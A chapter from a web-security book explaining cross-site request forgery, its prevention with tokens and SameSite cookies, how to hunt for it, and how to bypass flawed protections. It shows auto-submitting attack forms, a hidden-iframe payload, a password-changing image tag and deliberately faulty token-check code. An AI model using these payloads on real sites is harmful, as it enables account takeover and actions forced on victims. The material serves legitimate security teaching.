<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" epub:prefix="index: http://www.index.com/" lang="en" xml:lang="en">
	<head>
		<title>Chapter 9: Cross-Site Request Forgery</title>
		<link href="NSTemplate_v1.css" rel="stylesheet" type="text/css"/>
<meta content="urn:uuid:f533d35e-262b-449b-a78e-85650cfe86cd" name="Adept.expected.resource"/>
	</head>
	<body epub:type="bodymatter chapter">
		<section>
			<header>
				<h1 class="chapter"><span class="ChapterNumber"><span epub:type="pagebreak" id="Page_155" title="155"/>9</span><br/><span class="ChapterTitle">Cross-Site Request Forgery</span></h1>
			</header>
			<figure class="opener">
				<img alt="" src="image_fi/book_art/chapterart.png"/>
			</figure>
			<p class="ChapterIntro"><em>Cross-site request forgery (</em><em>CSRF)</em> is a client-side technique used to attack other users of a web application. Using CSRF, attackers can send HTTP requests that pretend to come from the victim, carrying out unwanted actions on a victim’s behalf. For example, an attacker could change your password or transfer money from your bank account without your permission.</p>
			<p>CSRF attacks specifically target state-changing requests, like sending tweets and modifying user settings, instead of requests that reveal sensitive user info. This is because attackers won’t be able to read the response to the forged requests sent during a CSRF attack. Let’s get into how this attack works.</p>
			<h2 id="h1-501546c09-0001"><span epub:type="pagebreak" id="Page_156" title="156"/>Mechanisms</h2>
			<p>
				Remember from <span class="xref" itemid="xref_target_Chapter 3">Chapter 3</span> that most modern web applications authenticate their users and manage user sessions by using session cookies. When you first log in to a website, the web server establishes a new session: it sends your browser a session cookie associated with the session, and this cookie proves your identity to the server. Your browser stores the session cookies associated with that website and sends them along with every subsequent request you send to the site. This all happens automatically, without the user’s involvement.</p>
			<p>
				For example, when you log into Twitter, the Twitter server sends your browser the session cookie via an HTTP response header called <code>Set-Cookie</code>:</p>
			<pre><code>Set-Cookie: session_cookie=<em>YOUR_TWITTER_SESSION_COOKIE</em>;</code></pre>
			<p>
				Your browser receives the session cookie, stores it, and sends it along via the <code>Cookie</code> HTTP request header in every one of your requests to Twitter. This is how the server knows your requests are legit:</p>
			<pre><code>Cookie: session_cookie=<em>YOUR_TWITTER_SESSION_COOKIE</em>;</code></pre>
			<p>Armed with your session cookie, you can carry out authenticated actions like accessing confidential information, changing your password, or sending a private message without reentering your password. To get ahold of your own session cookies, intercept the requests your browsers send to the site after you’ve logged in.</p>
			<p>
				Now let’s say there’s a Send a Tweet HTML form on Twitter’s web page. Users can enter their tweets by using this form and clicking the Submit button to send them (<a href="#figure9-1" id="figureanchor9-1">Figure 9-1</a>).</p>
			<figure>
				<img alt="f09001" class="keyline" src="image_fi/501546c09/f09001.png"/>
				<figcaption>
					<p><a id="figure9-1">Figure 9-1</a>: An example HTML form that allows users to send a tweet</p>
				</figcaption>
			</figure>
			<p>Note that Twitter doesn’t really use this form (and Twitter’s actual Send a Tweet functionality isn’t vulnerable to CSRF attacks). The source code of the example HTML form looks like this:</p>
			<pre><code>&lt;html&gt;<span aria-label="annotation1" class="CodeAnnotationCode">1</span> &lt;h1&gt;Send a tweet.&lt;/h1&gt;<span aria-label="annotation2" class="CodeAnnotationCode">2</span> &lt;form method="POST" action="https://twitter.com/send_a_tweet"&gt; <span aria-label="annotation3" class="CodeAnnotationCode">3</span> &lt;input type="text" name="tweet_content" value="Hello world!"&gt; <span aria-label="annotation4" class="CodeAnnotationCode">4</span> &lt;input type="submit" value="Submit"&gt; &lt;/form&gt;
&lt;/html&gt;</code></pre>
			<p>
				The <code>&lt;h1&gt;</code> tags denote a first-level HTML heading <span aria-label="annotation1" class="CodeAnnotation">1</span>, whereas the <code>&lt;form&gt;</code> tags define the beginning and end of an HTML form <span aria-label="annotation2" class="CodeAnnotation">2</span>. The form has the <span epub:type="pagebreak" id="Page_157" title="157"/>method attribute <code>POST</code> and the action attribute <code>https://twitter.com/send_a_tweet</code>. This means that the form will submit a POST request to the <em>https://twitter.com/send_a_tweet</em> endpoint when the user clicks Submit. Next, an <code>&lt;input&gt;</code> tag defines a text input with the default value of <code>Hello world!</code>. When the form is submitted, any user input in this field will be sent as a POST parameter named <code>tweet_content</code> <span aria-label="annotation3" class="CodeAnnotation">3</span>. A second input tag defines the <code>Submit</code> button <span aria-label="annotation4" class="CodeAnnotation">4</span>. When users click this button, the form will be submitted.</p>
			<p>
				When you click the Submit button on the page, your browser will send a POST request to <em>https://twitter.com/send_a_tweet</em>. The browser will include your Twitter session cookie with the request. You could see the request generated by the form in your proxy. It should look something like this:</p>
			<pre><code>POST /send_a_tweet
Host: twitter.com
Cookie: session_cookie=<em>YOUR_TWITTER_SESSION_COOKIE</em>
(POST request body)
tweet_content="Hello world!"</code></pre>
			<p>
				This functionality has a vulnerability: any site, and not just Twitter, can initiate this request. Imagine that an attacker hosts their own website that displays an HTML form like <a href="#figure9-2" id="figureanchor9-2">Figure 9-2</a>.</p>
			<figure>
				<img alt="f09002" class="keyline" src="image_fi/501546c09/f09002.png"/>
				<figcaption>
					<p><a id="figure9-2">Figure 9-2</a>: An example HTML form that an attacker uses to exploit a CSRF vulnerability</p>
				</figcaption>
			</figure>
			<p>The page’s source code is the following:</p>
			<pre><code>&lt;html&gt; &lt;h1&gt;Please click Submit.&lt;/h1&gt; &lt;form method="POST" action="https://twitter.com/send_a_tweet" id="csrf-form"&gt; &lt;input type="text" name="tweet_content" value="Follow @vickieli7 on Twitter!"&gt; &lt;input type='submit' value="Submit"&gt; &lt;/form&gt;
&lt;/html&gt;</code></pre>
			<p>
				When you click the Submit button on this page, your browser will send a POST request. Because the browser automatically includes your Twitter session cookies in requests to Twitter, Twitter will treat the request as valid, causing your account to tweet <code>Follow @vickieli7 on Twitter!</code> Here’s the corresponding request:</p>
			<pre><code>POST /send_a_tweet
Host: twitter.com
Cookie: session_cookie=<em>YOUR_TWITTER_SESSION_COOKIE</em><span epub:type="pagebreak" id="Page_158" title="158"/>(POST request body)
tweet_content="Follow @vickieli7 on Twitter!"</code></pre>
			<p>Even though this request doesn’t come from Twitter, Twitter will recognize it as valid because it includes your real Twitter session cookie. This attack would make you send the tweet every time you click Submit on the malicious page.</p>
			<p>It’s true that this attack page isn’t very useful: it requires the victim to click a button, which most users probably won’t do. How can attackers make the exploit more reliable? Realistically, a malicious CSRF page would look more like this:</p>
			<pre><code>&lt;html&gt;<b>  &lt;iframe style="display:none" name="csrf-frame"&gt; </b><span aria-label="annotation1" class="CodeAnnotationCode">1</span> &lt;form method="POST" action="https://twitter.com/send_a_tweet"  target="csrf-frame" id="csrf-form"&gt; <span aria-label="annotation2" class="CodeAnnotationCode">2</span> &lt;input type="text" name="tweet_content" value="Follow @vickieli7 on Twitter!"&gt; &lt;input type='submit' value="Submit"&gt; &lt;/form&gt;<b>  &lt;/iframe&gt;</b> <b>  &lt;script&gt;document.getElementById("csrf-form").submit();&lt;/script&gt; </b><span aria-label="annotation3" class="CodeAnnotationCode">3</span>
&lt;/html&gt;</code></pre>
			<p>
				This HTML places the form in an invisible iframe to hide it from the user’s view. Remember from <span class="xref" itemid="xref_target_Chapter 8">Chapter 8</span> that an <em>iframe </em>is an HTML element that embeds another document within the current HTML document. This particular iframe’s style is set to <code>display:none</code>, meaning it won’t be displayed on the page, making the form invisible <span aria-label="annotation1" class="CodeAnnotation">1</span>. Then, JavaScript code between the script tags <span aria-label="annotation3" class="CodeAnnotation">3</span> will submit the form with the ID <code>csrf-form</code> <span aria-label="annotation2" class="CodeAnnotation">2</span> without the need for user interaction. The code fetches the HTML form by referring to it by its ID, <code>csrf-form</code>. Then the code submits the form by calling the <code>submit()</code> method on it. With this new attack page, any victim who visits the malicious site will be forced to tweet.</p>
			<p>What attackers can actually accomplish with a real CSRF vulnerability depends on where the vulnerability is found. For example, let’s say a request that empties a user’s online shopping cart has a CSRF vulnerability. When exploited in the wild, this vulnerability can at most cause annoyance to the site users. It doesn’t have the potential to cause any major financial harm or identity theft.</p>
			<p>On the other hand, some CSRFs can lead to much bigger issues. If a CSRF vulnerability is present on requests used to change a user’s password, for example, an attacker can change other users’ passwords against their will and take over their entire accounts! And when a CSRF appears in functionalities that handle user finances, like account balance transfers, attackers can potentially cause unauthorized balance transfers out of the victim’s bank account. You can also use CSRFs to trigger injection vulnerabilities such as XSS and command injections.</p>
			<h2 id="h1-501546c09-0002"><span epub:type="pagebreak" id="Page_159" title="159"/>Prevention</h2>
			<p>
				The best way to prevent CSRFs is to use <em>CSRF tokens</em>. Applications can embed these random and unpredictable strings in every form on their website, and browsers will send this string along with every state-changing request. When the request reaches the server, the server can validate the token to make sure the request indeed originated from its website. This CSRF token should be unique for each session and/or HTML form so attackers can’t guess the token’s value and embed it on their websites. Tokens should have sufficient entropy so that they cannot be deduced by analyzing tokens across sessions.</p>
			<p>The server generates random CSRF tokens and embeds correct CSRF tokens in forms on the legitimate site. Notice the new input field used to specify a CSRF token:</p>
			<pre><code>&lt;form method="POST" action="https://twitter.com/send_a_tweet"&gt; &lt;input type="text" name="tweet_content" value="Hello world!"&gt; <b> &lt;input type="text" name="csrf_token" value="871caef0757a4ac9691aceb9aad8b65b"&gt;</b> &lt;input type="submit" value="Submit"&gt;
&lt;/form&gt;</code></pre>
			<p>
				Twitter’s server can require that the browser send the correct value of the <code>csrf_token</code> POST parameter along with the request for it to be successful. If the value of <code>csrf_token</code> is missing or incorrect, the server should see the request as fake and reject it.</p>
			<p>Here is the resulting POST request:</p>
			<pre><code>POST /send_a_tweet
Host: twitter.com
Cookie: session_cookie=<var>YOUR_TWITTER_SESSION_COOKIE</var>
(POST request body)
tweet_content="Hello world!"&amp;<b>csrf_token=871caef0757a4ac9691aceb9aad8b65b</b></code></pre>
			<p>Many frameworks have CSRF tokens built in, so often you can simply use your framework’s implementation.</p>
			<p>
				Besides implementing CSRF tokens to ensure the authenticity of requests, another way of protecting against CSRF is with <code>SameSite</code> cookies. The <code>Set-Cookie</code> header allows you to use several optional flags to protect your users’ cookies, one of which is the <code>SameSite</code> flag. When the <code>SameSite</code> flag on a cookie is set to <code>Strict</code>, the client’s browser won’t send the cookie during cross-site requests:</p>
			<pre><code>Set-Cookie: PHPSESSID=UEhQU0VTU0lE; Max-Age=86400; Secure; HttpOnly; SameSite=Strict</code></pre>
			<p>
				Another possible setting for the <code>SameSite</code> flag is <code>Lax</code>, which tells the client’s browser to send a cookie only in requests that cause top-level navigation (when users actively click a link and navigate to the site). This setting ensures that users still have access to the resources on your site if the cross-site request is intentional. For example, if you navigate to Facebook from <span epub:type="pagebreak" id="Page_160" title="160"/>a third-party site, your Facebook logins will be sent. But if a third-party site initiates a POST request to Facebook or tries to embed the contents of Facebook within an iframe, cookies won’t be sent:</p>
			<pre><code>Set-Cookie: PHPSESSID=UEhQU0VTU0lE; Max-Age=86400; Secure; HttpOnly; SameSite=Lax</code></pre>
			<p>
				Specifying the <code>SameSite</code> attribute is good protection against CSRF because both the <code>Strict</code> and <code>Lax</code> settings will prevent browsers from sending cookies on cross-site form POST or AJAX requests, and within iframes and image tags. This renders the classic CSRF hidden-form attack useless.</p>
			<p>
				In 2020, Chrome and a few other browsers made <code>SameSite=Lax</code> the default cookie setting if it’s not explicitly set by the web application. Therefore, even if a web application doesn’t implement CSRF protection, attackers won’t be able to attack a victim who uses Chrome with POST CSRF. The efficacy of a classic CSRF attack will likely be greatly reduced, since Chrome has the largest web browser market share. On Firefox, the <code>SameSite</code> default setting is a feature that needs to be enabled. You can enable it by going to <code>about:config</code> and setting <code>network.cookie.sameSite.laxByDefault</code> to <code>true</code>.</p>
			<p>
				Even when browsers adopt the <code>SameSite-</code>by-default policy, CSRFs are still possible under some conditions. First, if the site allows state-changing requests with the GET HTTP method, third-party sites can attack users by creating CSRF with a GET request. For example, if the site allows you to change a password with a GET request, you could post a link like this to trick users into clicking it: <em>https://email.example.com/password_change?new_password=abc123</em>.</p>
			<p>Since clicking this link will cause top-level navigation, the user’s session cookies will be included in the GET request, and the CSRF attack will succeed:</p>
			<pre><code>GET /password_change?new_password=abc123
Host: email.example.com
Cookie: session_cookie=<var>YOUR_SESSION_COOKIE</var></code></pre>
			<p>
				In another scenario, sites manually set the <code>SameSite</code> attribute of a cookie to <code>None</code>. Some web applications have features that require third-party sites to send cross-site authenticated requests. In that case, you might explicitly set <code>SameSite</code> on a session cookie to <code>None</code>, allowing the sending of the cookie across origins, so traditional CSRF attacks would still work. Finally, if the victim is using a browser that doesn’t set the <code>SameSite</code> attribute to <code>Lax</code> by default (including Firefox, Internet Explorer, and Safari), traditional CSRF attacks will still work if the target application doesn’t implement diligent CSRF protection.</p>
			<p>
				We’ll explore other ways of bypassing CSRF protection later in this chapter. For now, just remember: when websites don’t implement <code>SameSite</code> cookies or other CSRF protection for every state-changing request, the request becomes vulnerable to CSRF if the user is not using a <code>SameSite</code>-by-default browser. CSRF protection is still the responsibility of the website despite the adoption of <code>SameSite</code>-by-default.</p>
			<h2 id="h1-501546c09-0003"><span epub:type="pagebreak" id="Page_161" title="161"/>Hunting for CSRFs</h2>
			<p>CSRFs are common and easy to exploit. To look for them, start by discovering state-changing requests that aren’t shielded by CSRF protections. Here’s a three-step process for doing so. Remember that because browsers like Chrome offer automatic CSRF protection, you need to test with another browser, such as Firefox.</p>
			<h3 id="h2-501546c09-0001">Step 1: Spot State-Changing Actions</h3>
			<p>
				Actions that alter the users’ data are called <em>state-changing actions</em>. For example, sending tweets and modifying user settings are both state-changing. The first step of spotting CSRFs is to log in to your target site and browse through it in search of any activity that alters data.</p>
			<p>
				For example, let’s say you’re testing <em>email.example.com</em>, a subdomain of <em>example.com</em> that handles email. Go through all the app’s functionalities, clicking all the links. Intercept the generated requests with a proxy like Burp and write down their URL endpoints.</p>
			<p>Record these endpoints one by one, in a list like the following, so you can revisit and test them later:</p>
			<p class="ListHead"><b>State-changing requests on <b><i>email.example.com</i></b></b></p>
			<ul>
				<li>
					Change password: <em>email.example.com/password_change</em><p class="ListBody">POST request</p>
					<p class="ListBody">Request parameters: <code>new_password</code></p>
					</li>
				<li>
					Send email: <em>email.example.com/send_email</em><p class="ListBody">POST request</p>
					<p class="ListBody">Request parameters: <code>draft_id</code>, <code>recipient_id</code></p>
					</li>
				<li>
					Delete email: <em>email.example.com/delete_email</em><p class="ListBody">POST request</p>
					<p class="ListBody">Request parameters: <code>email_id</code></p>
					</li>
			</ul>
			<h3 id="h2-501546c09-0002">Step 2: Look for a Lack of CSRF Protections</h3>
			<p>
				Now visit these endpoints to test them for CSRFs. First, open up Burp Suite and start intercepting all the requests to your target site in the Proxy tab. Toggle the <b>Intercept</b> button until it reads <b>Intercept is on </b>(<a href="#figure9-3" id="figureanchor9-3">Figure 9-3</a>).</p>
			<figure>
				<img alt="f09003" class="keyline" src="image_fi/501546c09/f09003.png"/>
				<figcaption>
					<p><a id="figure9-3">Figure 9-3</a>: Set to Intercept is on to capture your browser’s traffic. Click the <b><i>Forward</i></b> button to forward the current request to the server.</p>
				</figcaption>
			</figure>
			<p><span epub:type="pagebreak" id="Page_162" title="162"/>Let Burp run in the background to record other traffic related to your target site while you’re actively hunting for CSRFs. Keep clicking the <b>Forward</b> button until you encounter the request associated with the state-changing action. For example, let’s say you’re testing whether the password-change function you discovered is vulnerable to CSRFs. You’ve intercepted the request in your Burp proxy:</p>
			<pre><code>POST /password_change
Host: email.example.com
Cookie: session_cookie=<var>YOUR_SESSION_COOKIE</var>
(POST request body)
new_password=abc123</code></pre>
			<p>
				In the intercepted request, look for signs of CSRF protection mechanisms. Use the search bar at the bottom of the window to look for the string <code>"csrf"</code> or <code>"state"</code>. CSRF tokens can come in many forms besides POST body parameters; they sometimes show up in request headers, cookies, and URL parameters as well. For example, they might show up like the cookie here:</p>
			<pre><code>POST /password_change
Host: email.example.com
Cookie: session_cookie=<var>YOUR_SESSION_COOKIE</var>; <b>csrf_token=871caef0757a4ac9691aceb9aad8b65b</b>
(POST request body)
new_password=abc123</code></pre>
			<p>But even if you find a CSRF protection present on the endpoint, you could try a variety of protection-bypass techniques. I’ll talk about them later in the chapter.</p>
			<h3 id="h2-501546c09-0003">Step 3: Confirm the Vulnerability</h3>
			<p>After you’ve found a potentially vulnerable endpoint, you’ll need to confirm the vulnerability. You can do this by crafting a malicious HTML form that imitates the request sent by the legitimate site.</p>
			<p>
				Craft an HTML page like this in your text editor. Make sure to save it with an <em>.html</em> extension! This way, your computer will open the file with a browser by default:</p>
			<pre><code>&lt;html&gt; &lt;form method="POST" action="https://email.example.com/password_change" id="csrf-form"&gt; <span aria-label="annotation1" class="CodeAnnotationCode">1</span> &lt;input type="text" name="new_password" value="abc123"&gt; <span aria-label="annotation2" class="CodeAnnotationCode">2</span> &lt;input type="submit" value="Submit"&gt; <span aria-label="annotation3" class="CodeAnnotationCode">3</span> &lt;/form&gt; &lt;script&gt;document.getElementById("csrf-form").submit();&lt;/script&gt; <span aria-label="annotation4" class="CodeAnnotationCode">4</span>
&lt;/html&gt;</code></pre>
			<p>
				The <code>&lt;form&gt;</code> tag specifies that you’re defining an HTML form. An HTML form’s <code>method</code> attribute specifies the HTML method of the request generated by the form, and the <code>action</code> attribute specifies where the request will be <span epub:type="pagebreak" id="Page_163" title="163"/>sent to <span aria-label="annotation1" class="CodeAnnotation">1</span>. The form generates a POST request to the endpoint <em>https://email.example.com/password_change</em>. Next are two input tags. The first one defines a POST parameter with the name <code>new_password</code> and the value <code>abc123</code> <span aria-label="annotation2" class="CodeAnnotation">2</span>. The second one specifies a <code>Submit</code> button <span aria-label="annotation3" class="CodeAnnotation">3</span>. Finally, the <code>&lt;script&gt;</code> tag at the bottom of the page contains JavaScript code that submits the form automatically <span aria-label="annotation4" class="CodeAnnotation">4</span>.</p>
			<p>Open the HTML page in the browser that is signed into your target site. This form will generate a request like this:</p>
			<pre><code>POST /password_change
Host: email.example.com
Cookie: session_cookie=<var>YOUR_SESSION_COOKIE</var>
(POST request body)
new_password=abc123</code></pre>
			<p>
				Check if your password on <em>email.example.com</em> has been changed to <code>abc123</code>. In other words, check if the target server has accepted the request generated by your HTML page. The goal is to prove that a foreign site can carry out state-changing actions on a user’s behalf.</p>
			<p>Finally, some websites might be missing CSRF tokens but still protect against CSRF attacks by checking if the referer header of the request matches a legitimate URL. Checking the referer header protects against CSRF, because these headers help servers filter out requests that have originated from foreign sites. Confirming a CSRF vulnerability like this can help you rule out endpoints that have referer-based CSRF protection.</p>
			<p>
				However, it’s important for developers to remember that referer headers can be manipulated by attackers and aren’t a foolproof mitigation solution. Developers should implement a combination of CSRF tokens and <code>SameSite</code> session cookies for the best protection.</p>
			<h2 id="h1-501546c09-0004">Bypassing CSRF Protection</h2>
			<p>Modern websites are becoming more secure. These days, when you examine requests that deal with sensitive actions, they’ll often have some form of CSRF protection. However, the existence of protections doesn’t mean that the protection is comprehensive, well implemented, and impossible to bypass. If the protection is incomplete or faulty, you might still be able to achieve a CSRF attack with a few modifications to your payload. Let’s talk about techniques you can use to bypass CSRF protection implemented on websites.</p>
			<h3 id="h2-501546c09-0004">Exploit Clickjacking</h3>
			<p>
				If the endpoint uses CSRF tokens but the page itself is vulnerable to clickjacking, an attack discussed in <span class="xref" itemid="xref_target_Chapter 8">Chapter 8</span>, you can exploit clickjacking to achieve the same results as a CSRF.</p>
			<p>
				This is because, in a clickjacking attack, an attacker uses an iframe to frame the page in a malicious site while having the state-changing request <span epub:type="pagebreak" id="Page_164" title="164"/>originate from the legitimate site. If the page where the vulnerable endpoint is located is vulnerable to clickjacking, you’ll be able to achieve the same results as a CSRF attack on the endpoint, albeit with a bit more effort and CSS skills.</p>
			<p>
				Check a page for clickjacking by using an HTML page like the following one. You can place a page in an iframe by specifying its URL as the <code>src</code> attribute of an <code>&lt;iframe&gt;</code> tag. Then, render the HTML page in your browser. If the page that the state-changing function is located in appears in your iframe, the page is vulnerable to clickjacking:</p>
			<pre><code>&lt;html&gt; &lt;head&gt; &lt;title&gt;Clickjack test page&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt;This page is vulnerable to clickjacking if the iframe is not blank!&lt;/p&gt; &lt;iframe src="PAGE_URL" width="500" height="500"&gt;&lt;/iframe&gt; &lt;/body&gt;
&lt;/html&gt;</code></pre>
			<p>
				Then you could use clickjacking to trick users into executing the state-changing action. Refer to <span class="xref" itemid="xref_target_Chapter 8">Chapter 8</span> to learn how this attack works.</p>
			<h3 id="h2-501546c09-0005">Change the Request Method</h3>
			<p>Another trick you can use to bypass CSRF protections is changing the request method. Sometimes sites will accept multiple request methods for the same endpoint, but protection might not be in place for each of those methods. By changing the request method, you might be able to get the action executed without encountering CSRF protection.</p>
			<p>For example, say the POST request of the password-change endpoint is protected by a CSRF token, like this:</p>
			<pre><code>POST /password_change
Host: email.example.com
Cookie: session_cookie=<var>YOUR_SESSION_COOKIE</var>
(POST request body)
new_password=abc123&amp;<b>csrf_token=871caef0757a4ac9691aceb9aad8b65b</b></code></pre>
			<p>You can try to send the same request as a GET request and see if you can get away with not providing a CSRF token:</p>
			<pre><code><b>GET /password_change?new_password=abc123</b>
Host: email.example.com
Cookie: session_cookie=<var>YOUR_SESSION_COOKIE</var></code></pre>
			<p>In this case, your malicious HTML page could simply look like this:</p>
			<pre><code>&lt;html&gt; &lt;img src="https://email.example.com/password_change?new_password=abc123"/&gt;
&lt;/html&gt;</code></pre>
			<p><span epub:type="pagebreak" id="Page_165" title="165"/>The HTML <code>&lt;img&gt;</code> tag loads images from external sources. It will send a GET request to the URL specified in its <code>src</code> attribute.</p>
			<p>If the password change occurs after you load this HTML page, you can confirm that the endpoint is vulnerable to CSRF via a GET request. On the other hand, if the original action normally uses a GET request, you can try converting it into a POST request instead.</p>
			<h3 id="h2-501546c09-0006">Bypass CSRF Tokens Stored on the Server</h3>
			<p>But what if neither clickjacking nor changing the request method works? If the site implements CSRF protection via tokens, here are a few more things that you can try.</p>
			<p>Just because a site uses CSRF tokens doesn’t mean it is validating them properly. If the site isn’t validating CSRF tokens in the right way, you can still achieve CSRF with a few modifications of your malicious HTML page.</p>
			<p>
				First, try deleting the token parameter or sending a blank token parameter. For example, this will send the request without a <code>csrf_token</code> parameter:</p>
			<pre><code>POST /password_change
Host: email.example.com
Cookie: session_cookie=<var>YOUR_SESSION_COOKIE</var>
(POST request body)
new_password=abc123</code></pre>
			<p>You can generate this request with an HTML form like this:</p>
			<pre><code>&lt;html&gt; &lt;form method="POST" action="https://email.example.com/password_change" id="csrf-form"&gt; &lt;input type="text" name="new_password" value="abc123"&gt; &lt;input type='submit' value="Submit"&gt; &lt;/form&gt; &lt;script&gt;document.getElementById("csrf-form").submit();&lt;/script&gt;
&lt;/html&gt;</code></pre>
			<p>
				This next request will send a blank <code>csrf_token</code> parameter:</p>
			<pre><code>POST /password_change
Host: email.example.com
Cookie: session_cookie=<var>YOUR_SESSION_COOKIE</var>
(POST request body)
new_password=abc123&amp;<b>csrf_token=</b></code></pre>
			<p>You can generate a payload like this by using an HTML form like the following:</p>
			<pre><code>&lt;html&gt; &lt;form method="POST" action="https://email.example.com/password_change" id"csrf-form"&gt; &lt;input type="text" name="new_password" value="abc123"&gt; &lt;input type="text" name="csrf_token" value=""&gt; &lt;input type='submit' value="Submit"&gt;<span epub:type="pagebreak" id="Page_166" title="166"/>  &lt;/form&gt; &lt;script&gt;document.getElementById("csrf-form").submit();&lt;/script&gt;
&lt;/html&gt;</code></pre>
			<p>
				Deleting the token parameter or sending a blank token often works because of a common application logic mistake. Applications sometimes check the validity of the token only<em> if</em> the token exists, or if the token parameter is not blank. The code for an insecure application’s validation mechanism might look roughly like this:</p>
			<pre><code>def validate_token():<span aria-label="annotation1" class="CodeAnnotationCode">1</span> if (request.csrf_token == session.csrf_token): pass else:<span aria-label="annotation2" class="CodeAnnotationCode">2</span> throw_error("CSRF token incorrect. Request rejected.")
[...]
def process_state_changing_action(): if request.csrf_token: validate_token()<span aria-label="annotation3" class="CodeAnnotationCode">3</span> execute_action()</code></pre>
			<p>
				This fragment of Python code first checks whether the CSRF token exists <span aria-label="annotation1" class="CodeAnnotation">1</span>. If it exists, the code will proceed to validate the token. If the token is valid, the code will continue. If the token is invalid, the code will stop the execution and produce an error <span aria-label="annotation2" class="CodeAnnotation">2</span>. On the other hand, if the token does not exist, the code will skip validation and jump to executing the action right away <span aria-label="annotation3" class="CodeAnnotation">3</span>. In this case, sending a request without the token, or a blank value as the token, may mean the server won’t attempt to validate the token at all.</p>
			<p>
				You can also try submitting the request with another session’s CSRF token. This works because some applications might check only whether the token is valid, without confirming that it belongs to the current user. Let’s say the victim’s token is <code>871caef0757a4ac9691aceb9aad8b65b</code>, and yours is <var>YOUR_TOKEN</var>. Even though it’s hard to get the victim’s token, you can obtain your own token easily, so try providing your own token in the place of the legitimate token. You can also create another test account to generate tokens if you don’t want to use your own tokens. For example, your exploit code might look like this:</p>
			<pre><code>POST /password_change
Host: email.example.com
Cookie: session_cookie=<var>YOUR_SESSION_COOKIE</var>
(POST request body)
new_password=abc123&amp;csrf_token=<var>YOUR_TOKEN</var></code></pre>
			<p>The faulty application logic might look something like this:</p>
			<pre><code>def validate_token(): if request.csrf_token:<span aria-label="annotation1" class="CodeAnnotationHang">1</span>  if (request.csrf_token in valid_csrf_tokens): pass<span epub:type="pagebreak" id="Page_167" title="167"/>  else: throw_error("CSRF token incorrect. Request rejected.")
[...]<span aria-label="annotation" class="CodeAnnotationHang"/>
def process_state_changing_action(): validate_token()<span aria-label="annotation2" class="CodeAnnotationCode">2</span> execute_action()</code></pre>
			<p>
				The Python code here first validates the CSRF token. If the token is in a list of current valid tokens <span aria-label="annotation1" class="CodeAnnotation">1</span>, execution continues and the state-changing action is executed <span aria-label="annotation2" class="CodeAnnotation">2</span>. Otherwise, an error is generated and execution halts. If this is the case, you can insert your own CSRF token into the malicious request!</p>
			<h3 id="h2-501546c09-0007">Bypass Double-Submit CSRF Tokens</h3>
			<p>
				Sites also commonly use a <em>double-submit cookie</em> as a defense against CSRF. In this technique, the state-changing request contains the same random token as both a cookie and a request parameter, and the server checks whether the two values are equal. If the values match, the request is seen as legitimate. Otherwise, the application rejects it. For example, this request would be deemed valid, because the <code>csrf_token</code> in the user’s cookies matches the <code>csrf_token</code> in the POST request parameter:</p>
			<pre><code>POST /password_change
Host: email.example.com
Cookie: session_cookie=<var>YOUR_SESSION_COOKIE</var>; csrf_token=871caef0757a4ac9691aceb9aad8b65b
(POST request body)
new_password=abc123&amp;csrf_token=871caef0757a4ac9691aceb9aad8b65b</code></pre>
			<p>
				And the following one would fail. Notice that the <code>csrf_token</code> in the user’s cookies is different from the <code>csrf_token</code> in the POST request parameter. In a double-submit token validation system, it does not matter whether the tokens themselves are valid. The server checks only whether the token in the cookies is the same as the token in the request parameters:</p>
			<pre><code>POST /password_change
Host: email.example.com
Cookie: session_cookie=<var>YOUR_SESSION_COOKIE</var>; <b>csrf_token=1aceb9aad8b65b871caef0757a4ac969</b>
(POST request body)
new_password=abc123&amp;<b>csrf_token=871caef0757a4ac9691aceb9aad8b65b</b></code></pre>
			<p>If the application uses double-submit cookies as its CSRF defense mechanism, it’s probably not keeping records of the valid token server-side. If the server were keeping records of the CSRF token server-side, it could simply validate the token when it was sent over, and the application would not need to use double-submit cookies in the first place.</p>
			<p><span epub:type="pagebreak" id="Page_168" title="168"/>The server has no way of knowing if any token it receives is actually legitimate; it’s merely checking that the token in the cookie and the token in the request body is the same. In other words, this request, which enters the same bogus value as both the cookie and request parameter, would also be seen as legitimate:</p>
			<pre><code>POST /password_change
Host: email.example.com
Cookie: session_cookie=<var>YOUR_SESSION_COOKIE</var>; <b>csrf_token=not_a_real_token</b>
(POST request body)
new_password=abc123&amp;<b>csrf_token=not_a_real_token</b></code></pre>
			<p>Generally, you shouldn’t have the power to change another user’s cookies. But if you can find a way to make the victim’s browser send along a fake cookie, you’ll be able to execute the CSRF.</p>
			<p>
				The attack would then consist of two steps: first, you’d use a session-fixation technique to make the victim’s browser store whatever value you choose as the CSRF token cookie. <em>Session fixation</em> is an attack that allows attackers to select the session cookies of the victim. We do not cover session fixations in this book, but you can read about them on Wikipedia (<a class="LinkURL" href="https://en.wikipedia.org/wiki/Session_fixation">https://en.wikipedia.org/wiki/Session_fixation</a>). Then, you’d execute the CSRF with the same CSRF token that you chose as the cookie.</p>
			<h3 id="h2-501546c09-0008">Bypass CSRF Referer Header Check</h3>
			<p>What if your target site isn’t using CSRF tokens but checking the referer header instead? The server might verify that the referer header sent with the state-changing request is a part of the website’s allowlisted domains. If it is, the site would execute the request. Otherwise, it would deem the request to be fake and reject it. What can you do to bypass this type of protection?</p>
			<p>
				First, you can try to remove the referer header. Like sending a blank token, sometimes all you need to do to bypass a referer check is to not send a referer at all. To remove the referer header, add a <code>&lt;meta&gt;</code> tag to the page hosting your request form:</p>
			<pre><code>&lt;html&gt;<b>  </b><b>&lt;meta name="referrer" content="no-referrer"&gt;</b> &lt;form method="POST" action="https://email.example.com/password_change" id="csrf-form"&gt; &lt;input type="text" name="new_password" value="abc123"&gt; &lt;input type='submit' value="Submit"&gt; &lt;/form&gt; &lt;script&gt;document.getElementById("csrf-form").submit();&lt;/script&gt;
&lt;/html&gt;</code></pre>
			<p>
				This particular <code>&lt;meta&gt;</code> tag tells the browser to not include a referer header in the resulting HTTP request.</p>
			<p>The faulty application logic might look like this:</p>
			<pre><code>def validate_referer(): if (request.referer in allowlisted_domains):<span epub:type="pagebreak" id="Page_169" title="169"/>    pass else: throw_error("Referer incorrect. Request rejected.")
[...]
def process_state_changing_action(): if request.referer: validate_referer() execute_action()</code></pre>
			<p>Since the application validates the referer header only if it exists, you’ve successfully bypassed the website’s CSRF protection just by making the victim’s browser omit the referer header!</p>
			<p>
